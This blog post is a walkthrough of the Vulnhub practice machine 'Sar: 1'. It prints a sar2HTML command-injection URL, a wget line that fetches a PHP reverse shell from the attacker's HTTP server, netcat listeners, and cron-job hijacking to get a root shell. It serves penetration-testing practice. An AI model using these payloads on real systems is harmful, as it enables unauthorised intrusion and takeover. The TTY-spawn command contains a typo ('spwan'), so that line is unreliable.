---
layout: post
title:  "Vulnhub: Sar 1"
date:  2020-04-12 16:03:36 +0530
categories: writeup Vulnhub_CTF
---
Hello All, Today I am writing a walkthrough on vulnhub machine Sar: 1.

As per the creator of this machine “Sar is an OSCP-Like VM with the intent of gaining experience in the world of penetration testing.”

Let us begin with basic enumerations!

__Network Scanning:__

The Nmap scan __*“nmap -A -T4 192.168.0.101”*__ gives the below output.
![nmap](/images/sar1_1.png)
As mentioned in the result we can observe that HTTP service would be landing us into the default apache web page.

__Enumeration:_
So without wasting much time I went ahead and ran a dirb to identify the web contents.

__*dirb http://192.168.0.101/*__ which gave the following result.

![dirb](/images/sar1_2.png)

Looking at robots.txt file we landed to _**http://192.168.0.101/sar2HTML/**_

![sar2html](/images/sar1_3.png)

Further with google-fu identified an exploit-db result with exploit details for the relevant version of sar2html

![sar2html](/images/sar1_4.png)

According to exploit-db : any commands entered after *__“plot=;”__* will be executed by the application and can be seen at the host dropdown option towards the left panel of the application while selecting the host.

So lets try this crafted payload: __http://192.168.0.101/sar2HTML/index.php?plot=NEW;ls__  

![sar2html](/images/sar1_5.png)

Provided that I went ahead and tried if we could download anything to the application using __“wget”__ command. It worked!! moving ahead I modified the __*“php_reverse_shell.php”*__ file and started __“netcat listener on 1234"__

__http://192.168.0.101/sar2HTML/index.php?plot=NEW;wget__
__http://192.168.0.195:8000/shell.php__

![sar2html](/images/sar1_6.png)

And by accessing the uploaded shell.php file it gives us a shell of __www-data__ user.

![sar2html](/images/sar1_7.png)

Using __python3 -c “import pty;pty.spwan(‘/bin/bash’)”;__ I broke the TTY shell.

Without wasting time I went ahead and transferred LinEnum.sh script to the target machine using a simple HTTP server.

The script can be downloaded here:__https://github.com/rebootuser/LinEnum__

And transferred it through:

__www-data@sar:/var/www/html$ wget http://192.168.0.195:8000/LinEnum.sh && chmod +x LinEnum.sh__

By running the script it was able to identify a cronjob is running to execute __*“finally.sh”*__ under __*“/var/www/html”*__ directory every __5 minutes__.

![cornjob](/images/sar1_8.png)

So, I went ahead and read the script with cat command finally.sh and could understand that it again executes another script in the same directory __write.sh__.

Listing __*/var/www/html*__ directory we could see that the user __www-data__ has access to write.sh.

![cornjob](/images/sar1_9.png)

Moving ahead I deleted the __write.sh__ file and created a new one with a reverse shell.

![cornjob](/images/sar1_10.png)

I transferred the file to target machine and started netcat listener on port __4444__.

![cornjob](/images/sar1_11.png)

I waited for a few minutes and got my root reverse shell (since cronjob will execute the command in write.sh with sudo privilege).

![cornjob](/images/sar1_12.png)

That's it. We got the root access and the flags can be collected under /home/love/Desktop and /root/ folder. Thank you !
